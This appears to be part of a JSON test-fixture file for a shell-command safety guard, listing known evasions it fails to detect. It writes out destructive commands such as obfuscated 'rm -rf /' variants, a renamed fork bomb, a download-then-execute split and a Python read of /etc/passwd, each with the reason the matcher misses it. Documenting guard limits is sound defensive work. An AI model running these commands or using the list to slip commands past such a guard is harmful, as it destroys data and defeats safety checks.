    {
      "id": "known-limit-rm-rf-double-quoted-target",
      "command": "rm -rf \"/\"",
      "expected": [],
      "knownLimit": true,
      "knownLimitReason": "the matcher reads the literal target token; a quoted / does not equal the bare / pattern"
    },
    {
      "id": "known-limit-rm-rf-single-quoted-target",
      "command": "rm -rf '/'",
      "expected": [],
      "knownLimit": true,
      "knownLimitReason": "same as the double-quoted form, with single quotes"
    },
    {
      "id": "known-limit-rm-rf-backslash-escaped-target",
      "command": "rm -rf \\/",
      "expected": [],
      "knownLimit": true,
      "knownLimitReason": "an escaped slash is not the literal / token the dangerous-target list matches"
    },
    {
      "id": "known-limit-rm-rf-variable-indirection",
      "command": "D=/; rm -rf $D",
      "expected": [],
      "knownLimit": true,
      "knownLimitReason": "the matcher has no shell semantics; it cannot resolve $D to /"
    },
    {
      "id": "known-limit-rm-rf-command-substitution",
      "command": "rm -rf $(echo /)",
      "expected": [],
      "knownLimit": true,
      "knownLimitReason": "the matcher does not execute or resolve command substitution"
    },
    {
      "id": "known-limit-rm-rf-glob-expansion",
      "command": "rm -rf /???",
      "expected": [],
      "knownLimit": true,
      "knownLimitReason": "the matcher does not expand shell globs before comparing the target"
    },
    {
      "id": "known-limit-rm-rf-heredoc",
      "command": "bash <<< 'rm -rf /'",
      "expected": [],
      "knownLimit": true,
      "knownLimitReason": "the payload lives inside a heredoc the matcher never inspects"
    },
    {
      "id": "known-limit-download-then-exec-split",
      "command": "curl x>/tmp/s.sh && bash /tmp/s.sh",
      "expected": [],
      "knownLimit": true,
      "knownLimitReason": "download-exec only catches curl/wget PIPED directly to a shell, not a download-then-exec split across two commands"
    },
    {
      "id": "known-limit-native-interpreter-exfiltration",
      "command": "python -c \"open('/etc/passwd').read()\"",
      "expected": [],
      "knownLimit": true,
      "knownLimitReason": "the guard has no model of Python (or any other interpreter) semantics"
    },
    {
      "id": "known-limit-renamed-fork-bomb",
      "command": "f(){f|f&};f",
      "expected": [],
      "knownLimit": true,
      "knownLimitReason": "the fork-bomb rule is a signature match on the classic :(){ :|:& };: form, not a general recursive-function detector"
    },
    {
      "id": "known-limit-obfuscated-rm-via-printf-hex",
      "command": "printf '\\x72\\x6d -rf /' | sh",
      "expected": [],
      "knownLimit": true,
      "knownLimitReason": "the hex-encoded payload never appears as literal rm -rf text for the matcher to see"
    }
  ]
}
